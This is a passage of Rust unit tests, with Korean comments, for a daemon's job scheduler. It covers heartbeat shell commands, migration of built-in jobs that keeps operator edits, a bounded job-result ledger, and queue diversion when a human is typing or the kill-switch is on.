                std::fs::set_permissions(bin.join(name), std::fs::Permissions::from_mode(0o700)).unwrap();
            }
            for (fail_first, expected) in [("1", 1), ("0", 0)] {
                let out = std::process::Command::new("/bin/sh")
                    .arg("-c").arg(&cmd).env_clear()
                    .env("HOME", &root).env("CYS_PACK_DIR", &root)
                    .env("PATH", &bin).env("FAIL_FIRST", fail_first)
                    .output().unwrap();
                assert_eq!(out.status.code(), Some(expected), "중간 실패 누적/성공 반환이 틀렸다");
                assert_eq!(std::fs::read_to_string(root.join("seen")).unwrap(),
                           "/tmp/first.sock\n/tmp/last.sock\n", "실패 뒤 부서가 실행되지 않았다");
                let stderr = String::from_utf8_lossy(&out.stderr);
                assert_eq!(stderr.contains("ensure failed"), expected == 1);
                // (성찰 2회) 실패 부서 지목 — first 만, last 는 아니다.
                assert_eq!(
                    stderr.contains("formation-heartbeat: ensure failed dept=first"), expected == 1,
                    "실패 부서 지목이 틀렸다(FAIL_FIRST={fail_first}): {stderr}"
                );
                assert!(!stderr.contains("dept=last"), "성공한 부서가 실패로 지목됐다: {stderr}");
                std::fs::remove_file(root.join("seen")).unwrap();
            }
            std::fs::remove_dir_all(root).unwrap();
        }
    }

    /// ★WP6-5 — 동버전 기존 설치본의 이번 구 표현을 이관하고 운영자 편집은 보존한다.
    #[test]
    fn heartbeat_fix_reaches_existing_installs_via_the_migration_table() {
        let old = BUILTIN_COMMAND_MIGRATIONS.iter()
            .find(|(id, old, _)| *id == "formation-heartbeat"
                && old.contains("--cwd") && old.contains(concat!("--json ||", " true")))
            .expect("현재 구 표현이 이관표에 없다 — P3 구 표현만으로는 기존 설치본에 안 닿는다");
        let want = builtin("formation-heartbeat");
        let mut existing = want.clone();
        existing["command"] = json!(old.1);
        existing["every_minutes"] = json!(17);
        let mut jobs = vec![existing.clone()];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed && conflicts.is_empty());
        assert_eq!(jobs[0]["command"], want["command"]);
        assert!(jobs[0]["command"].as_str().unwrap().contains("exit $rc"));
        // (성찰 2회) 이관 결과에 실패 부서 지목이 실려 있다.
        assert!(
            jobs[0]["command"].as_str().unwrap().contains("ensure failed dept=$d"),
            "이관 뒤 실패 부서 지목이 없다"
        );
        assert_eq!(jobs[0]["every_minutes"], 17, "command 외의 운영자 편집이 소실됐다");
        existing["command"] = json!(format!("{} # 운영자 주석", old.1));
        let mut edited = vec![existing.clone()];
        let _ = apply_builtin_jobs(&mut edited);
        assert_eq!(edited[0], existing, "구 표현과 다른 운영자 편집이 소실됐다");
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "표적 이관에 전역 버전을 올렸다(§B-5 위반)");
    }

    /// ★U10(0.14.41) 0.14.40 설치본이 심은 편성 심박 command — **바이트 정확 사본**(이관표 대조용).
    const U10_PRE_HEARTBEAT: &str = "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; rc=0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; c=\"$(\"$pk/bin/cys-dept\" cwd \"$d\" 2>/dev/null)\" || c=\"\"; python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" ${c:+--cwd \"$c\"} --json || { rc=1; echo \"formation-heartbeat: ensure failed dept=$d\" >&2; }; done; exit $rc";

    /// ★U10(0.14.41 · 반박 M1/DD1) 편성 심박은 부서마다 **그 부서 팩**(cys-dept `dept_pack` 과 같은 규칙)으로
    /// 편성을 돌린다 — 본부 팩 env 로 돌면 새로 띄운 부서 좌석에 본부 지침·MEMORY 가 주입되고 각성 훅 경고가
    /// 켤 때마다 오탐으로 쌓인다. 부서 팩이 설치 전(boot_node 부재)이면 종전 팩(`$pk`)으로 접는다(자가치유
    /// 전멸 방지 — 편성 실패로 번지지 않는다). CYS_STATE_DIR 는 건드리지 않는다(싱글플라이트 락 불변식).
    #[test]
    fn u10_formation_heartbeat_runs_each_dept_in_its_lane_pack() {
        let cmd = builtin("formation-heartbeat")["command"].as_str().unwrap().to_string();
        assert!(
            cmd.contains(r#"lp="$HOME/.cys/pack-dept-$d"; { [ -f "$lp/bin/javis_boot_node.py" ] && [ ! -e "$pk/AUTOPILOT_PAUSED" ]; } || lp="$pk";"#),
            "부서 레인 팩 유도(+설치 전·본부 kill-switch 폴백)가 없다: {cmd}"
        );
        assert!(
            cmd.contains(r#"CYS_PACK_DIR="$lp" python3 "$pk/bin/javis_formation.py" ensure --socket "$s""#),
            "편성에 레인 팩을 싣지 않는다: {cmd}"
        );
        assert!(!cmd.contains("CYS_STATE_DIR"), "편성 락 불변식 위반 — CYS_STATE_DIR 를 재설정했다: {cmd}");
        let dept = include_str!("../../../cysjavis-pack/bin/cys-dept");
        assert!(
            dept.contains(r#"dept_pack(){ echo "$HOME/.cys/pack-dept-$1"; }"#),
            "cys-dept 의 부서 팩 규칙과 심박 규칙이 갈렸다"
        );
        assert!(
            BUILTIN_COMMAND_MIGRATIONS
                .iter()
                .any(|(id, old, _)| *id == "formation-heartbeat" && *old == U10_PRE_HEARTBEAT),
            "0.14.40 설치본의 심박이 이관표에 없다 — 기존 함대에 닿지 않는다"
        );
        let mut jobs = vec![{
            let mut j = builtin("formation-heartbeat");
            j["command"] = json!(U10_PRE_HEARTBEAT);
            j
        }];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed && conflicts.is_empty(), "0.14.40 심박이 이관되지 않았다");
        assert_eq!(jobs[0]["command"].as_str(), Some(cmd.as_str()));

        // 실제 POSIX 셸: 부서 팩 설치됨 → 그 팩 · 미설치 → $pk · CYS_STATE_DIR 통과.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let root = std::env::temp_dir().join(format!(
                "cys-u10-hb-{}-{}", std::process::id(), now_epoch().to_bits()
            ));
            let bin = root.join("bin");
            std::fs::create_dir_all(&bin).unwrap();
            std::fs::create_dir_all(root.join(".cys/pack-dept-first/bin")).unwrap();
            std::fs::write(root.join(".cys/pack-dept-first/bin/javis_boot_node.py"), "stub\n").unwrap();
            std::fs::write(bin.join("cys-dept"), r#"#!/bin/sh
case "$1" in
    list) printf 'first\nlast\n' ;;
    sock) printf '/tmp/%s.sock\n' "$2" ;;
    cwd) exit 4 ;;
    *) exit 1 ;;
esac
"#).unwrap();
            std::fs::write(bin.join("python3"), r#"#!/bin/sh
printf '%s %s %s\n' "$4" "$CYS_PACK_DIR" "${CYS_STATE_DIR:-unset}" >> "$HOME/seen"
exit 0
"#).unwrap();
            std::fs::write(bin.join("javis_formation.py"), "stub\n").unwrap();
            for name in ["cys-dept", "python3"] {
                std::fs::set_permissions(bin.join(name), std::fs::Permissions::from_mode(0o700)).unwrap();
            }
            let out = std::process::Command::new("/bin/sh")
                .arg("-c").arg(&cmd).env_clear()
                .env("HOME", &root).env("CYS_PACK_DIR", &root)
                .env("CYS_STATE_DIR", "/tmp/u10-state")
                .env("PATH", &bin)
                .output().unwrap();
            assert_eq!(out.status.code(), Some(0), "{}", String::from_utf8_lossy(&out.stderr));
            let seen = std::fs::read_to_string(root.join("seen")).unwrap();
            assert_eq!(
                seen,
                format!(
                    "/tmp/first.sock {}/.cys/pack-dept-first /tmp/u10-state\n/tmp/last.sock {} /tmp/u10-state\n",
                    root.display(),
                    root.display()
                ),
                "부서 레인 팩 선택 또는 미설치 폴백이 틀렸다"
            );
            // 본부 팩 kill-switch 파일 → 부서 팩으로 전환하지 않는다(종전 정지 범위 유지).
            std::fs::remove_file(root.join("seen")).unwrap();
            std::fs::write(root.join("AUTOPILOT_PAUSED"), "").unwrap();
            let out = std::process::Command::new("/bin/sh")
                .arg("-c").arg(&cmd).env_clear()
                .env("HOME", &root).env("CYS_PACK_DIR", &root)
                .env("PATH", &bin)
                .output().unwrap();
            assert_eq!(out.status.code(), Some(0));
            let seen = std::fs::read_to_string(root.join("seen")).unwrap();
            assert!(
                seen.lines().all(|l| l.split(' ').nth(1) == Some(root.to_str().unwrap())),
                "본부 kill-switch 중인데 부서 팩으로 전환했다(정지 우회): {seen}"
            );
            std::fs::remove_dir_all(root).unwrap();
        }
    }

    /// ★P8 — 승격 틱은 **좌석 신원 전부**를 지운 role-less 집행자로 돈다.
    ///
    /// 실패 방향: `CYS_ROLE` 만 지우면 `CYS_SURFACE_ID` 를 물려받은 cysd 가 자기를 'master' 로
    /// 권위 있게 답하고, cys-dept 단일소유 가드가 승격을 **exit 7 로 거부**한다 — 10분마다,
    /// 조용히, 영구히(대기형 CEO 가 영원히 승격되지 않는다).
    #[test]
    fn p8_promote_tick_scrubs_every_seat_identity_input() {
        let cmd = builtin("ceo-promote-pending-tick")["command"].as_str().unwrap().to_string();
        for k in [
            "CYS_ROLE",
            "CYS_SURFACE_ID",
            "CYS_SURFACE_REF",
            "CYS_SEAT_TOKEN",
            "CYS_DEPT_ROTATE",
        ] {
            assert!(
                cmd.contains(&format!("-u {k}")),
                "좌석 신원 입력 '{k}' 를 지우지 않는다 — 그 하나로 판정이 뚫린다: {cmd}"
            );
        }
    }

    /// ★이관 — 두 수정이 **기존 설치본**에 닿는다(동버전 무접촉 계약을 깨지 않고).
    ///
    /// 실패 방향(이 검체가 없을 때): builtin 의 command 만 고치면 `_builtin_version` 이 같아
    /// `apply_builtin_jobs` 가 무접촉하고, 결함 있는 구 표현이 실제 함대에 영원히 남는다
    /// (신규 설치에서만 고쳐진다 = 피해자에게 닿지 않는 수정).
    #[test]
    fn migration_upgrades_the_known_bad_command_but_never_an_operator_edit() {
        // ① 표의 구 표현은 실제로 **지금 코드 정의와 다르다**(표가 죽은 항목이 아니다).
        for (id, old, why) in BUILTIN_COMMAND_MIGRATIONS {
            let want = builtin(id)["command"].as_str().unwrap().to_string();
            assert_ne!(
                &want, old,
                "이관표의 '{id}' 구 표현이 코드 정의와 같다 — 표가 무의미하다(또는 수정이 사라졌다)"
            );
            // (성찰 2회) 항목마다 자기 사유가 있다 — 이관 로그가 남의 결함을 찍지 않는다.
            assert!(!why.trim().is_empty(), "이관표 '{id}' 항목에 사유가 없다");
        }
        // ② 구 표현 = 이관된다(동버전인데도).
        let ver = builtin("formation-heartbeat")["_builtin_version"].as_u64().unwrap();
        let mut jobs = vec![serde_json::json!({
            "id": "formation-heartbeat",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            "command": BUILTIN_COMMAND_MIGRATIONS[0].1,
            "_builtin": "formation",
            "_builtin_version": ver
        })];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed, "구 표현이 이관되지 않았다");
        assert!(conflicts.is_empty(), "우리 잡이 선점 충돌로 보고됐다: {conflicts:?}");
        let migrated = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("formation-heartbeat"))
            .unwrap()["command"]
            .as_str()
            .unwrap()
            .to_string();
        assert!(migrated.contains("--cwd"), "이관 뒤에도 --cwd 가 없다: {migrated}");

        // ③ 음성 대조 — **운영자 편집은 건드리지 않는다**(구 표현과 한 글자만 달라도).
        let edited = format!("{} # 운영자 주석", BUILTIN_COMMAND_MIGRATIONS[0].1);
        let mut jobs2 = vec![serde_json::json!({
            "id": "formation-heartbeat",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            "command": edited.clone(),
            "_builtin": "formation",
            "_builtin_version": ver
        })];
        let _ = apply_builtin_jobs(&mut jobs2);
        assert_eq!(
            jobs2
                .iter()
                .find(|j| j["id"].as_str() == Some("formation-heartbeat"))
                .unwrap()["command"]
                .as_str()
                .unwrap(),
            edited,
            "운영자 수기 편집이 무언 소실됐다(§B-5 위반)"
        );

        // ④ 전역 버전은 이 이관으로 올라가지 않는다(범프 = 모든 builtin 통째 교체).
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "표적 이관에 전역 버전을 올렸다(§B-5 위반)");
    }

}

/// ★U4-B2①(0.14.41) 스케줄 잡 결과 원장 검체 — 메모리 전용 · 드러내기만.
#[cfg(test)]
mod b2_job_results {
    use super::tests::test_daemon;
    use super::*;
    use std::sync::atomic::{AtomicU64, Ordering};

    // ───────── U4-B2① 스케줄 잡 결과 원장(메모리 전용 · 드러내기만) ─────────

    fn b2_unique(tag: &str) -> String {
        static SEQ: AtomicU64 = AtomicU64::new(0);
        format!(
            "b2-{tag}-{}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        )
    }

    fn job(time: Option<&str>, days: &[&str]) -> Job {
        Job {
            id: "t".into(),
            time: time.map(|s| s.to_string()),
            every_minutes: None,
            at: None,
            close_after_secs: None,
            days: days.iter().map(|s| s.to_string()).collect(),
            action: "push".into(),
            to: None,
            text: None,
            text_command: None,
            command: None,
            if_absent: None,
            fresh: false,
            base_only: false,
            via_queue: false,
            launch: None,
        }
    }

    fn b2_cmd_job(id: &str, cmd: &str) -> Job {
        let mut j = job(None, &[]);
        j.id = id.into();
        j.action = "command".into();
        j.command = Some(cmd.into());
        j
    }

    /// ★U4-B2① 핀: 주기 잡이 매번 실패해도 `schedule list` 에는 '제때 발화'만 보였다
    /// (`last_fired` 는 발화 **전** 기록 · 결과 필드 0). 결과 원장이 `status()`(= `schedule.status`
    /// RPC = `cys schedule list`)로 드러나야 한다 — 실패 연속 계수 · 성공 재설정 · skip 구분.
    /// ★개정 전 소스에서는 적색이다(`job_results` 키 부재).
    #[tokio::test(flavor = "current_thread")]
    async fn schedule_job_results_expose_failure_streak_and_reset() {
        let daemon = test_daemon();
        let id = b2_unique("fail");
        for _ in 0..3 {
            fire(Arc::clone(&daemon), b2_cmd_job(&id, "exit 3")).await;
        }
        let st = status(&daemon);
        let r = &st["job_results"][id.as_str()];
        assert_eq!(r["last_result"].as_str(), Some("error"), "{st}");
        assert_eq!(r["consecutive_failures"].as_u64(), Some(3), "{r}");
        assert_eq!(r["consecutive_non_ok"].as_u64(), Some(3), "{r}");
        assert!(r["last_ok_at"].is_null(), "성공한 적이 없으면 null 이다(0 으로 위장 금지): {r}");
        assert!(r["last_result_at"].as_i64().is_some(), "{r}");
        assert!(
            r["last_detail"].as_str().unwrap_or("").contains('3'),
            "실패 사유(종료코드)가 남아야 한다: {r}"
        );
        // 성공 1회 → 두 연속 계수 재설정 + last_ok_at 기록(재무장).
        fire(Arc::clone(&daemon), b2_cmd_job(&id, "exit 0")).await;
        let st = status(&daemon);
        let r = &st["job_results"][id.as_str()];
        assert_eq!(r["last_result"].as_str(), Some("ok"), "{r}");
        assert_eq!(r["consecutive_failures"].as_u64(), Some(0), "{r}");
        assert_eq!(r["consecutive_non_ok"].as_u64(), Some(0), "{r}");
        assert!(r["last_ok_at"].as_i64().is_some(), "{r}");
        // skip(대상 역할 부재 · if_absent=skip)은 실패가 아니지만 ok 도 아니다(D2 — 거짓 OK 금지).
        let sid = b2_unique("skip");
        let mut p = job(None, &[]);
        p.id = sid.clone();
        p.to = Some("b2-nobody".into());
        p.text = Some("[b2] x".into());
        p.if_absent = Some("skip".into());
        for _ in 0..2 {
            fire(Arc::clone(&daemon), p.clone()).await;
        }
        let st = status(&daemon);
        let r = &st["job_results"][sid.as_str()];
        assert_eq!(r["last_result"].as_str(), Some("skipped"), "{r}");
        assert_eq!(r["consecutive_non_ok"].as_u64(), Some(2), "{r}");
        assert_eq!(r["consecutive_failures"].as_u64(), Some(0), "skip 은 실패로 세지 않는다: {r}");
        assert!(r["last_ok_at"].is_null(), "{r}");
    }

    /// ★U4-B2① 핀: 결과 5분류 — `Ok` 팔이라도 적재(queued)·건너뜀(skipped)은 성공(ok)이 아니다
    /// (반박 D2), 시간초과(timeout)는 오류(error)와 따로 센다(반박 D11 — formation 600s 오보 구분).
    #[test]
    fn classify_fire_result_five_kinds() {
        use JobResultKind as K;
        let ok = |s: &str| classify_fire_result(&Ok(s.to_string()));
        let err = |s: &str| classify_fire_result(&Err(s.to_string()));
        assert_eq!(ok("command exit=Some(0)"), K::Ok);
        assert_eq!(ok("pushed to master (surface:3)"), K::Ok);
        assert_eq!(ok("fresh-launched and pushed (surface:9)"), K::Ok);
        assert_eq!(ok("queued to cso (surface:4)"), K::Queued);
        assert_eq!(ok("fresh-launched and queued (surface:9)"), K::Queued);
        // ★review1 m7 FIX: WP-B4가 deliver_push에 도입 예정인 모달 우회 문안(별도 워크트리
        // wp41-B4) — 공백 없이 "queued("로 이어진다. 좁은 "queued " 접두라면 여기서 Ok(성공)로
        // 새어 CSO가 오독한다(통합 전 이 워크트리에서 선제 회귀 핀).
        assert_eq!(ok("queued(modal) to cso (surface:4)"), K::Queued, "WP-B4 통합 대비 — queued(modal) 도 큐 적재다");
        assert_eq!(ok("skipped: role 'cso' absent (if_absent=skip)"), K::Skipped);
        assert_eq!(err("command timed out (600s)"), K::Timeout);
        assert_eq!(err("launch-agent timed out (180s)"), K::Timeout);
        assert_eq!(err("text_command 30초 타임아웃"), K::Timeout);
        assert_eq!(err("command 비정상 종료(Some(3)): boom"), K::Error);
        // 명령 자신의 stderr 에 섞인 "timed out" 은 상한 만료가 아니다.
        assert_eq!(err("command 비정상 종료(Some(28)): curl: (28) Operation timed out"), K::Error);
        assert_eq!(err("role 'x' absent (set if_absent=launch|skip)"), K::Error);
    }

    /// ★U4-B2① 소스 핀: 분류기가 읽는 문안은 **생산자의 문안 그대로**여야 한다 — 한쪽만 바뀌면
    /// 적재가 성공으로(또는 시간초과가 오류로) 조용히 접힌다.
    #[test]
    fn classify_fire_result_matches_producer_wording() {
        let src = include_str!("schedule.rs");
        for needle in [
            "format!(\"skipped: role '{to}' absent (if_absent=skip)\")",
            "format!(\"{how} to {to} (surface:{sid})\")",
            "format!(\"fresh-launched and {how} (surface:{sid})\")",
            ".map(|_| \"queued\")",
            "d.starts_with(\"queued\")",
            "return Ok(\"pushed\");",
            "\"command timed out (600s)\"",
            "\"launch-agent timed out (180s)\"",
            "\"text_command 30초 타임아웃\"",
        ] {
            assert!(src.contains(needle), "생산자 문안이 바뀌었다 — 분류기와 함께 고쳐라: {needle}");
        }
    }

    /// ★U4-B2① 핀: 원장은 **상한이 있고**(오래된 항목부터 밀려남) 사유 문안은 절단된다.
    #[test]
    fn job_result_ledger_is_bounded_and_truncates_detail() {
        let mut l = JobResultLedger::default();
        for i in 0..(JOB_RESULT_LEDGER_CAP + 10) {
            l.record(&format!("j{i}"), JobResultKind::Ok, "x", i as i64);
        }
        assert_eq!(l.len(), JOB_RESULT_LEDGER_CAP);
        assert!(l.get("j0").is_none(), "가장 오래된 항목부터 밀려나야 한다");
        assert!(l.get(&format!("j{}", JOB_RESULT_LEDGER_CAP + 9)).is_some());
        // 이미 있는 id 의 갱신은 밀어내기를 일으키지 않는다.
        let keep = format!("j{}", JOB_RESULT_LEDGER_CAP + 9);
        l.record(&keep, JobResultKind::Error, &"가".repeat(1000), 10_000);
        assert_eq!(l.len(), JOB_RESULT_LEDGER_CAP);
        let e = l.get(&keep).unwrap();
        assert_eq!(e.last_detail.chars().count(), JOB_RESULT_DETAIL_MAX_CHARS);
        assert_eq!(e.consecutive_failures, 1);
        assert_eq!(e.last_ok_at, Some((JOB_RESULT_LEDGER_CAP + 9) as i64), "직전 성공 시각 보존");
    }

    /// ★U4-B2① 소스 핀(반박 D1·설계 §3 B2①): 원장은 **메모리 전용**이다 — `schedule_state.json`
    /// 에 두 번째 writer 가 생기면 고정 tmp 이름 경합으로 손상 격리→재시드 계급(앵커 ③)이 다시 열린다.
    /// 그리고 원장은 **발화 판정에 쓰이지 않는다**(드러내기만 — 발화 억제·지연 0).
    #[test]
    fn job_result_ledger_is_memory_only_and_never_gates_firing() {
        let src = include_str!("schedule.rs");
        let at = src.find("impl JobResultLedger {").expect("원장 impl 소실");
        let end = at + src[at..].find("\n}\n").expect("impl 끝");
        let body = &src[at..end];
        assert!(
            !body.contains("std::fs") && !body.contains("save_state") && !body.contains("File::"),
            "결과 원장이 디스크에 쓴다 — 메모리 전용 계약 위반"
        );
        let st = src.find("struct ScheduleState {").expect("ScheduleState 소실");
        let st_end = st + src[st..].find("\n}\n").expect("struct 끝");
        let st_body = &src[st..st_end];
        assert!(
            !st_body.contains("job_result") && !st_body.contains("consecutive"),
            "영속 스키마에 결과 필드가 들어갔다(두 번째 writer 계급)"
        );
        let t = src.find("\nfn scheduler_tick(").expect("scheduler_tick 소실");
        let t_end = t + 1 + src[t + 1..].find("\n}\n").expect("tick 끝");
        assert!(
            !src[t..t_end].contains("job_result"),
            "발화 판정이 결과 원장을 읽는다 — 드러내기 전용 계약 위반(발화 억제 금지)"
        );
    }
}

// ═══════════ ★(0.14.42 · 설계 H2) 스케줄 직접 push — 하드축 양성 관측 시에만 큐 우회 ═══════════
#[cfg(test)]
mod h2_schedule_hold_tests {
    use super::*;
    use crate::governance::{h_ledger_count, h_paint, HKnobGuard, H_DRAFT_SCREEN, H_IDLE_SCREEN};
    use serde_json::json;
    use std::sync::atomic::Ordering;

    fn rig(tag: &str) -> (Arc<Daemon>, Arc<crate::state::Surface>) {
        crate::delivery::tests::isolate_state_dir_for_thread(tag);
        let daemon = super::tests::test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("master".into()), 24, 80)
            .expect("좌석");
        daemon.roles.lock().unwrap().insert("master".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        std::thread::sleep(std::time::Duration::from_millis(300));
        (daemon, s)
    }

    fn job(v: serde_json::Value) -> Job {
        serde_json::from_value(v).expect("잡")
    }

    fn periodic(id: &str, every: u64) -> Job {
        job(json!({"id": id, "every_minutes": every, "action": "push", "to": "master", "text": "x"}))
    }

    fn queue(s: &Arc<crate::state::Surface>) -> Vec<crate::state::QueueEntry> {
        s.pending_queue.lock().unwrap().iter().cloned().collect()
    }

    fn done(s: &Arc<crate::state::Surface>) {
        let _ = s.child.lock().unwrap().kill();
    }

    /// 직접 주입 뒤 writer(본문 → 500ms → CR)와 PTY 에코가 끝나기를 기다린다 — 다음 화면을 그리기 전에.
    fn settle() {
        std::thread::sleep(std::time::Duration::from_millis(900));
    }

    /// [H2] 마커 좌석 화면에 초안이 **양성 관측**되면 직접 주입하지 않고 좌석 큐로 우회한다.
    /// RED(HEAD): "pushed" + 주입(원장 schedule 1).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_role_push_diverts_on_observed_draft() {
        let (d, s) = rig("h2-draft");
        h_paint(&s, H_DRAFT_SCREEN);
        let j = periodic("heartbeat-5m", 5);
        let got = deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None);
        assert_eq!(got, Ok("queued(gate:draft)"), "초안 위에 직접 주입했다(초안 병합)");
        assert_eq!(h_ledger_count(&d, "schedule"), 0, "원장 schedule 기록 = 직접 주입이 있었다");
        let q = queue(&s);
        assert_eq!(q.len(), 1);
        assert_eq!(q[0].origin, "schedule");
        assert_eq!(q[0].from.as_deref(), Some("schedule:heartbeat-5m"));
        assert_eq!(q[0].ttl_secs, Some(300), "주기 잡 우회 항목 TTL = 주기");
        assert_eq!(classify_fire_result(&Ok("queued(gate:draft) to master".into())), JobResultKind::Queued);
        done(&s);
    }

    /// [H2] 사람 입력 10s 전 → queued(gate:human) · quiescing → queued(gate:quiescing)(이후 틱은 H1 이 보류한다).
    /// RED(HEAD): pushed.
    #[test]
    fn h2_role_push_diverts_on_human_30s_and_quiescing() {
        let (d, s) = rig("h2-human");
        h_paint(&s, H_IDLE_SCREEN);
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(10));
        let j = periodic("hb", 5);
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] a", None), Ok("queued(gate:human)"));
        *s.last_human_input.lock().unwrap() = None;
        *s.agent_status.lock().unwrap() = Some(crate::state::AgentStatus {
            state: "quiescing".into(),
            context_pct: None,
            task: None,
            updated_at: now_epoch(),
        });
        // ★(R1-F3) 같은 잡은 대기 1회분이라(적재 중복 제거) 둘째 축은 다른 잡으로 잰다.
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] b", None), Ok("queued(dedup)"));
        assert_eq!(deliver_push(&d, &periodic("hb2", 5), s.id, "[heartbeat] b", None), Ok("queued(gate:quiescing)"));
        assert_eq!(h_ledger_count(&d, "schedule"), 0, "창 안 직접 주입 0");
        assert_eq!(queue(&s).len(), 2);
        // 사람 흔적이 30s 를 넘겼고 quiescing 이 풀리면 종전 직접 주입.
        *s.agent_status.lock().unwrap() = None;
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(40));
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] c", None), Ok("pushed"));
        assert_eq!(h_ledger_count(&d, "schedule"), 1);
        done(&s);
    }

    /// [H2 ⓒ] 틱(pause 확인)과 push 사이에 kill-switch 가 켜지면 Err(delivery_frozen) — 주입 0 · 큐 0.
    /// via_queue 의 Frozen 과 같은 규약. RED(HEAD): pushed.
    #[test]
    fn h2_pause_between_tick_and_push_is_error() {
        let (d, s) = rig("h2-pause");
        h_paint(&s, H_IDLE_SCREEN);
        d.paused.store(true, Ordering::Relaxed);
        let err = deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] x", None)
            .expect_err("pause 중에 직접 주입했다(kill-switch 구멍 ⓒ)");
        assert!(err.starts_with("delivery_frozen"), "{err}");
        assert_eq!(classify_fire_result(&Err(err)), JobResultKind::Error);
        assert_eq!(h_ledger_count(&d, "schedule"), 0);
        assert!(queue(&s).is_empty());
        // fresh 잡도 pause 를 다시 본다.
        let fresh = job(json!({"id": "f", "action": "push", "to": "master", "text": "x", "fresh": true,
                               "launch": {"role": "worker", "agent": "claude"}}));
        assert!(deliver_push(&d, &fresh, s.id, "[schedule f] x", None).is_err());
        d.paused.store(false, Ordering::Relaxed);
        done(&s);
    }

    /// [H2 생명선 · 음성 · ③ 가드] 관측 불능 좌석은 종전 직접 주입 그대로다 — 마커 없음 · 프롬프트 미관측 ·
    /// alt-screen 파손 · pending=5 ∧ 커서행 미관측. 전후 GREEN.
    #[test]
    fn h2_unobservable_seat_stays_direct() {
        let (d, s) = rig("h2-lifeline");
        let j = periodic("hb", 1);
        let mut n = 0;
        let mut expect_direct = |label: &str| {
            n += 1;
            assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 생명선", None), Ok("pushed"), "{label}");
            assert_eq!(h_ledger_count(&d, "schedule"), n, "{label}: 직접 주입 원장");
            assert!(queue(&s).is_empty(), "{label}: 큐로 우회했다(관측 불능은 보류 근거가 아니다)");
            settle();
        };
        // ① 마커 없는 좌석(어댑터 미등록 = 맨 셸 등급).
        *s.agent_meta.lock().unwrap() = None;
        h_paint(&s, H_DRAFT_SCREEN);
        expect_direct("마커 없음");
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        // ② prompt_unknown — 커서행에 마커가 없다.
        h_paint(&s, "● 출력만 있는 화면\n다른 행");
        expect_direct("prompt_unknown");
        // ③ alt-screen 파손 — 전체화면 쓰레기.
        s.alt_screen.store(true, Ordering::Relaxed);
        h_paint(&s, "▒▒▒ 깨진 전체화면 ▒▒▒");
        expect_direct("alt-screen 파손");
        s.alt_screen.store(false, Ordering::Relaxed);
        // ④ stale 계수 단독(pending=5 ∧ line None).
        s.pending_input_bytes.store(5, Ordering::Relaxed);
        h_paint(&s, "● 렌더 잔상");
        expect_direct("pending=5 ∧ line None");
        done(&s);
    }

    /// ★(리뷰 F1 · ③) 워커가 `cys send` 뒤 Return 을 잊어 master 입력줄에 **기계 잔여**(검증 발신자 본문 · owner 세대
    /// 일치)가 남았다 — 스케줄 직접 push 는 큐로 우회하지 않고 종전처럼 직접 주입한다. 큐는 입력줄 점유를 스스로 풀지
    /// 않아 우회 항목이 TTL 까지 서고 다음 회차도 같은 길을 간다(heartbeat·wakeup 무기한 침묵). 병합 제출이 유일한
    /// 자가치유 경로다(pre-H 동작). 음성 대조: 같은 화면이 사람 초안이면 종전대로 우회. RED(HEAD): queued(gate:draft).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_machine_residue_stays_direct() {
        let (d, s) = rig("h2-residue");
        s.apply_pending_input(b"WORKER-REPORT residue text", crate::governance::InputOrigin::Machine);
        s.mark_pending_owner(9);
        h_paint(&s, "● 작업 로그 한 줄\n────────────────────\n❯ WORKER-REPORT residue text");
        let j = periodic("heartbeat-5m", 5);
        assert_eq!(
            deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None),
            Ok("pushed"),
            "기계 잔여 위에서 큐로 우회했다 — 푸는 주체 없는 보류(③ 자가치유 전멸)"
        );
        assert_eq!(h_ledger_count(&d, "schedule"), 1, "직접 주입 원장");
        assert!(queue(&s).is_empty(), "우회 항목이 남았다");
        // 앞 주입의 붙여넣기 창(본문 → 500ms → CR)과 렌더 settle 이 지나도록 기다린다.
        std::thread::sleep(std::time::Duration::from_millis(1600));
        s.clear_pending_input();
        s.apply_pending_input("오너가 쓰다 둔 초안".as_bytes(), crate::governance::InputOrigin::Human);
        h_paint(&s, H_DRAFT_SCREEN);
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None), Ok("queued(gate:draft)"), "사람 초안은 종전대로 우회");
        assert_eq!(h_ledger_count(&d, "schedule"), 1);
        done(&s);
    }

